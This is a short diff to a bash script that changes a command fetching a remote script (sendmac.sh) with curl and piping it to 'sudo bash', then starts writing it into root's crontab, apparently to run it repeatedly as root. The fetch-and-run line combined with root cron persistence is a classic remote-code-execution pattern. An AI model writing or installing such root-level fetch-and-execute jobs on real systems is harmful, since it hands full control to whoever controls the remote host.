@@ -1,6 +1,6 @@
 #!/bin/bash
 
-command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sh"
+command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
 
 #write out current crontab
 sudo crontab -u root -l > mycron
